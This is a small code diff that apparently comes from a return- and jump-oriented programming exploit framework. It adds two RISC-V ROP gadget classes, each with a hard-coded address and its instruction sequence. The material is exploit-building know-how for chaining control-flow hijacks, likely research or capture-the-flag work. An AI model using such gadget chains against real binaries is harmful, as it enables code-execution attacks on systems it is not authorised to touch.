@@ -79,6 +79,36 @@ class RestoreA3(ROP_Gadget):
     def __init__(self):
         super().__init__(0x48156)
 
+class MovA0_S0(ROP_Gadget):
+    '''
+    ld ra, 0x38(sp)
+    mv a0, s0
+    ld s0, 0x30(sp)
+    ld s1, 0x28(sp)
+    ld s2, 0x20(sp)
+    ld s3, 0x18(sp)
+    ld s4, 0x10(sp)
+    ld s5, 0x8(sp)
+    ld s6, 0(sp)
+    addi sp, sp, 0x40
+    '''
+    def __init__(self):
+        super().__init__(0x1484c)
+
+class MovS0_A0(ROP_Gadget):
+    '''
+    mv s0, a0
+    add	s10, s10, s4
+    beqz s3, -0x38
+    mv a2, s6
+    mv a1, s1
+    mv a0, s10
+    beqz s2, -0xcc
+    jalr s7
+    '''
+    def __init__(self):
+        super().__init__(0x144ec)
+
 class InitializeA3(JOP_Gadget):
     '''
     mv	a3, s7
